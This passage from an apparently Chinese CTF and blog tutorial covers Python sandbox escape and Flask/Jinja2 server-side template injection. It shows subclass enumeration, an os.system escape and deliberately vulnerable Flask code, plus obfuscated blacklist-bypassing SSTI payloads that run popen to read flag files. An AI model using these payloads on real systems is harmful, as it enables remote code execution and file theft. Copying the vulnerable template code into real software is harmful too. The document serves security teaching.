&#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__import__&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)----------4-----------(60, &#39;__import__&#39;)(60, &#39;file&#39;)(60, &#39;repr&#39;)(60, &#39;compile&#39;)(60, &#39;eval&#39;)(60, &#39;open&#39;)(60, &#39;execfile&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步获取可以直接执行命令或者读取文件的类</p><pre class="line-numbers language-none"><code class="language-none">----------1-----------                                                                (40, &#39;file&#39;)                                                                          ----------2-----------                                                                (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                   (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                  (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                    (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                   (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)                               (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)                               ----------3-----------                                                                (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)                               (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)                               (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)                            (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)                                    (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)                                         (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)                                          (78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)                             (79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)                             ----------4-----------                                                                (60, &#39;file&#39;)                                                                          (60, &#39;repr&#39;)                                                                          (60, &#39;eval&#39;)                                                                          (60, &#39;open&#39;)                                                                          (60, &#39;execfile&#39;)                                                                      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选取其中一个执行命令，<code>__mro__</code>输出父类，最后一个父类为object</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]&lt;class &#39;site._Printer&#39;&gt;&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读取文件</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&quot;C:\\windows\\win.ini&quot;).read()&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI&#x3D;1\nCMCDLLNAME32&#x3D;mapi32.dll\nCMC&#x3D;1\nMAPIX&#x3D;1\nMAPIXVER&#x3D;1.0.0.1\nOLEMessagin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中还可以执行的模块还有很多，比如使用含有<code>__builtins__</code>的其他模块，来调用加载的os等。</p><p>筛选代码来源：<a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95">Python沙箱逃逸总结</a></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>服务器端模板注入。既然谈到SSTI，在python中就要提一下flask，jinja2模板。此处利用网上一段代码</p><pre class="line-numbers language-none"><code class="language-none">from flask import Flaskfrom flask import request, render_template_string, render_templateapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;login&#39;)def hello_ssti():    person &#x3D; &#123;        &#39;name&#39;: &#39;hello&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    &#125;    if request.args.get(&#39;name&#39;):        person[&#39;name&#39;] &#x3D; request.args.get(&#39;name&#39;)    template &#x3D; &#39;&lt;h2&gt;Hello %s!&lt;&#x2F;h2&gt;&#39; % person[&#39;name&#39;]    return render_template_string(template, person&#x3D;person)    if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(debug&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当如下请求的时候就会显示其他参数，比如secret</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;login?name&#x3D;&#123;&#123;person[%27secret%27]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中的<code>render_template_string</code>和另一个模板函数<code>render_template</code>区别在第一个参数是否可以传入字符串，但是传入字符串就一定会有问题吗？修改template参数</p><pre class="line-numbers language-none"><code class="language-none">from flask import Flaskfrom flask import request, render_template_stringapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;login&#39;)def hello_ssti():    person &#x3D; &#123;        &#39;name&#39;: &#39;hello&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    &#125;    if request.args.get(&#39;name&#39;):        person[&#39;name&#39;] &#x3D; request.args.get(&#39;name&#39;)    template &#x3D; &#39;&lt;h2&gt;Hello &#123;&#123;person.name &#125;&#125;!&lt;&#x2F;h2&gt;&#39;    return render_template_string(template, person&#x3D;person)    if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(debug&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做如下请求的时候，就会显示<code>Hello {{person['secret']}}!</code>，我们传入的参数被当作字符串显示出来。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;login?name&#x3D;&#123;&#123;person[%27secret%27]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>name参数传入后，先修改person中的name值，person变成</p><pre class="line-numbers language-none"><code class="language-none">person &#x3D; &#123;        &#39;name&#39;: &#39;&#123;&#123;person[&#39;secret&#39;]&#125;&#125;&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>后面调用模板，来执行的时候，根据变量取值，又把<code>person.name</code>获取出来，传入<code>render_template_string</code>的就是<code>&#39;&lt;h2&gt;Hello {{person.name}}!&lt;/h2&gt;&#39;</code>，取值后整体被当作字符串显示。这里跟上面格式化字符串的时候不一样的地方就出来了，当我们直接传入<code>{{person['secret']}}</code>的时候，调用模板变量取值的时候，先格式化字符串，把传入字符串当作变量来处理。也就是<code>&#39;&lt;h2&gt;Hello {{person['secret']}}!&lt;/h2&gt;&#39;</code>加载到<code>render_template_string</code>。这又涉及到python的字符串格式化。</p><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><p>在python中常见的字符串格式化有几种形式</p><h4 id="操作符"><a href="#操作符" class="headerlink" title="%操作符"></a>%操作符</h4><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; name &#x3D; &quot;aaa&quot;&gt;&gt;&gt; &#39;%s&#39; %name&#39;aaa&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="string-Template"><a href="#string-Template" class="headerlink" title="string.Template"></a>string.Template</h4><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; from string import Template&gt;&gt;&gt; name &#x3D; &#39;aaa&#39;&gt;&gt;&gt; tem &#x3D; Template(&#39;$name&#39;)&gt;&gt;&gt; tem.substitute(name&#x3D;name)&#39;aaa&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>python2.6后引用的格式化字符串的函数</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; name &#x3D; &#39;aaa&#39;&gt;&gt;&gt; &#39;&#123;&#125;&#39;.format(name)&#39;aaa&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="f-Strings"><a href="#f-Strings" class="headerlink" title="f-Strings"></a>f-Strings</h4><p>python3.6后新增的字符串格式化方式，可以执行其中的python语句。</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; name &#x3D; &#39;aaa&#39;&gt;&gt;&gt; f&#39;&#123;name&#125;&#39;&#39;aaa&#39;&gt;&gt;&gt; f&#39;&#123;name.upper()&#125;&#39;&#39;AAA&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如何利用字符串格式化来读取敏感文件</p><pre class="line-numbers language-none"><code class="language-none">def view(request, *args, **kwargs):    template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)    return HttpResponse(template.format(user&#x3D;request.user))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果控制了email参数就是控制了字符串格式化一部分，当传入<code>&#123;user.password&#125;</code>的时候就会显示用户的哈希密码。<code>user</code>是当前上下文中仅有的一个变量，也就是format函数传入的<code>user=request.user</code>，Django中<code>request.user</code>是当前用户对象，这个对象包含一个属性<code>password</code>，也就是该用户的密码。所以，<code>&#123;user.password&#125;</code>实际上就是输出了<code>request.user.password</code>。</p><p>以上代码：<a href="https://xz.aliyun.com/t/288">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw">一文掌握CTF中Python全部考点</a></p><h3 id="CTF-利用"><a href="#CTF-利用" class="headerlink" title="CTF 利用"></a>CTF 利用</h3><p>下面用几个CTF题来感受一下。</p><h4 id="flask-真香"><a href="#flask-真香" class="headerlink" title="flask 真香"></a>flask 真香</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask%E7%9C%9F%E9%A6%99">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask%E7%9C%9F%E9%A6%99</a></p><p>不过这个环境现在搭建会有点问题，flask会使用的是最新1.1.2版本，显示的request.url会先url编码再显示到页面上，需要更改flask版本。</p><p>修改Dockerfile文件:</p><pre class="line-numbers language-none"><code class="language-none">RUN pip3 install flask&#x3D;&#x3D;0.12.1RUN pip3 install MarkupSafe&#x3D;&#x3D;1.0RUN pip3 install jinja2&#x3D;&#x3D;2.9 RUN pip3 install Werkzeug&#x3D;&#x3D;0.14.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>启动后就能愉快的看到页面了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150449.png" alt="image-20200422144323164"></p><p>禁用了不少关键词，然后使用的session对象来解决，就直接利用上手</p><p>在查找子父类的函数上，<code>__mro__</code>被禁用了，但是<code>__bases__</code>并没有。先找到object类</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150452.png" alt="image-20200422153648190"></p><p>然后再去获取子类，由于class被禁用，<code>__subclasses__</code>不能直接使用。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150453.png" alt="image-20200422160624948"></p><p>其中可以利用的有open和popen，open在<code>__builtins__</code>里面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150455.png" alt="image-20200422170120593"></p><p>执行命令查找文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150458.png" alt="image-20200422170817564"></p><p>读取文件即可</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150500.png" alt="image-20200422170906003"></p><p>使用open，但是需要知道文件位置</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150502.png" alt="image-20200422171331227"></p><p>如果不想用session，或者session也不能用了，就需要更多的绕过方式，下面会提到这种。</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;(((()|attr((&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;bases&quot;,&quot;_&quot;*2)|join))[0]|attr((&quot;_&quot;*2,&quot;subcla&quot;,&quot;sses&quot;,&quot;_&quot;*2)|join)())[102]|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get(&#39;pop&#39;+&#39;en&#39;)(&#39;cat%20&#x2F;Th1s__is_S3cret&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150506.png" alt="image-20200423171734174"></p><h4 id="flask-plus"><a href="#flask-plus" class="headerlink" title="flask plus"></a>flask plus</h4><p>[<a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask%20PLUS]">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask%20PLUS]</a>(<a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask</a> PLUS)</p><p>同样的页面，说明应该是增加了过滤的东西，同样修改Dockerfile文件。</p><p>使用上一个POC，发现<code>__init__</code>被过滤了。至少到这一步是正常的</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150508.png" alt="image-20200423102101580"></p><p>然后只需要把<code>__init__</code>做拼接就行了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150510.png" alt="image-20200423102442838"></p><p>如果某种情况下不能拼接，或者不想去这么做，也可以去查是否有替代属性。要求能替代<code>__init__</code>，要有<code>__globals__</code>属性。也就是重载过<code>__init__</code></p><pre class="line-numbers language-none"><code class="language-none">import osfor i in dir(os._wrap_close):    if &#39;__globals__&#39; in dir(eval(&#39;os._wrap_close.&#39;+i)):        print(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概符合标准的有</p><pre class="line-numbers language-none"><code class="language-none">__enter__   __exit__    __getattr__ __init__    __iter__    close       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>__enter__</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150512.png" alt="image-20200423104717984"></p><p>使用<code>__getattr__ </code>，不过这个被禁用了。需要拼接，这就跟上面<code>__init__</code>类似了。更换<code>__iter__</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150514.png" alt="image-20200423104853471"></p><p><code>close</code>也被禁用了。<code>__exit__</code>还可以使用</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150516.png" alt="image-20200423105018271"></p><h4 id="flask-改"><a href="#flask-改" class="headerlink" title="flask 改"></a>flask 改</h4><p>如果在过滤中只过滤了特殊符号，比如<code>__</code>这种，代码</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-from flask import Flask,render_template,render_template_string,redirect,request,session,abort,send_from_directoryimport osapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():    &quot;主页&quot;    return render_template(&quot;index2.html&quot;)    @app.route(&#39;&#x2F;user&#39;)def user():    def safe_jinja(s):        blacklist &#x3D; [&#39;__class__&#39;,&#39;__init__&#39;,&#39;__&#39;]        flag &#x3D; True        for no in blacklist:            if no.lower() in s.lower():               flag&#x3D; False               break        return flag    template &#x3D; &#39;&#39;&#39;&#123;%% block body %%&#125;    &lt;div class&#x3D;&quot;center-content error&quot;&gt;        &lt;h3&gt;%s&lt;&#x2F;h3&gt;    &lt;&#x2F;div&gt; &#123;%% endblock %%&#125;&#39;&#39;&#39; % (request.url)            if safe_jinja(request.args.get(&#39;name&#39;)):        return render_template_string(template)    else:        return render_template_string(&quot;&lt;h2&gt;NO!&lt;&#x2F;h2&gt;&quot;)        if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是上面这种对参数过滤的形式，<code>request.args.param</code>来获取新参数的值</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150519.png" alt="image-20200423143634582"></p><p>如果是把<code>[]</code>也过滤掉，就需要用jinja2模板函数来处理，比如<code>attr()</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150521.png" alt="image-20200423144945343"></p><p>构造请求</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150523.png" alt="image-20200423143742243"></p><p>现在可以看到上面过滤掉了<code>__class__</code>，这种也可以采用</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150526.png" alt="image-20200423144033662"></p><p>如何利用这种过滤来获取flag，其中由于中括号被禁用，利用列表的pop方法。但是元组没有pop方法，所以需要先转换成list，再去调用，字典可以使用get()获取键值。原flag文件名带双下划线改成单下划线了。如果其中的某个字符串关键词，比如<code>class</code>被禁用，直接拼接来绕过就行。</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;(((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(258)|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get((&quot;_&quot;*2,&quot;builtins&quot;,&quot;_&quot;*2)|join).get(&#39;open&#39;)(&#39;Th1s_is_F1114g&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150528.png" alt="image-20200423155904496"></p><p>原代码中是过滤掉<code>join</code>的，所以这里也可以使用<code>format</code>来处理</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150530.png" alt="image-20200423145253095"></p><p>完整的利用就是</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;(((request|attr(request.args.f|format(request.args.a))|attr(request.args.f|format(request.args.b))|list).pop(-1)|attr(request.args.f|format(request.args.c))()).pop(118)|attr(request.args.f|format(request.args.d))|attr(request.args.f|format(request.args.e))).get(&#39;popen&#39;)(&#39;cat%20Th1s_is_F1114g&#39;).read()&#125;&#125;&amp;f&#x3D;%s&amp;a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;__init__&amp;e&#x3D;__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150532.png" alt="image-20200423162231707"></p><p>再如果觉得其他参数中这种形式会被禁用，也可以更多参数分化执行。<code>request.args</code>也可以改为<code>request.values</code>。</p><pre class="line-numbers language-none"><code 